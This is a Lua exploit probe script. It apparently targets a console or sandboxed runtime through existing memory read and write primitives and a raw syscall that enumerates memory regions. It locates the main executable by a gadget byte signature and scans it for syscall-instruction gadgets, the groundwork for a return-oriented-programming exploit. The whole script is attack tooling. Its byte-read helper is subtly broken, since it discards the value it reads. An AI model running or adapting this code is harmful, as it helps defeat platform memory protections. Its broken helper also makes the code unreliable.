-- CRASH_CLASS: LOW
print("=== PROBE 623a: SYSCALL CONTEXT ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function raw(a) local o,v=pcall(function() memory.read_byte(a) end) if o then return N(v) end return nil end
local function rawd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
local function rawq(a) local o,v=pcall(function() return memory.read_qword(a) end) if o then return N(v) end return nil end
local function hi(a) return math.floor((a or 0)/4294967296) end
local function lo(a) return math.floor((a or 0)%4294967296) end
local function hex(a) return string.format("%08X_%08X",hi(a),lo(a)) end

local sc674=mk(674)
local bufp=memory.alloc(0x20000)
local cnt=memory.alloc(4) wd(N(cnt),0)
pcall(function() sc674(U(N(bufp)),uint64(72),uint64(512),U(N(cnt)),uint64(0x40000000),uint64(0)) end)
local okc,cv=pcall(function() return memory.read_dword(N(cnt)) end)
local n=okc and N(cv) or 0
local RS,RE,RP={},{},{}
for i=0,n-1 do
    local b=N(bufp)+i*72
    RS[i+1]=N(rawq(b)); RE[i+1]=N(rawq(b+8)); RP[i+1]=N(rawd(b+0x18))
end
local eboot=nil
for k=1,n do
    if RP[k]==5 and RE[k]-RS[k]>0x92C6B then
        local s=RS[k]
        if raw(s+0x92C67)==0x48 and raw(s+0x92C68)==0x89 and raw(s+0x92C69)==0x07 and raw(s+0x92C6A)==0xC3 then eboot=s end
    end
end
if not eboot then print("[!] no eboot"); return end
print(string.format("[A] eboot=%s",hex(eboot)))
local g=""
for j=0,23 do g=g..string.format("%02X",raw(eboot+0x92C67+j) or 0) end
print(string.format("[B] mover ctx %s",g))

local found=0
local lim=0x240000
local off=0
while off<lim and found<6 do
    local d=rawd(eboot+off)
    if d then
        local b0=d%256 local b1=math.floor(d/256)%256 local b2=math.floor(d/65536)%256
        if (b0==0x0F and b1==0x05) or (b1==0x0F and b2==0x05) then
            local a=eboot+off+(b0==0x0F and 0 or 1)
            local out=""
            for j=-4,19 do out=out..string.format("%02X",raw(a+j) or 0) end
            print(string.format("  @+%X %s",a-eboot,out))
            found=found+1
        end
    end
    off=off+1
end
print(string.format("[C] found=%d",found))
print("[Z] alive")
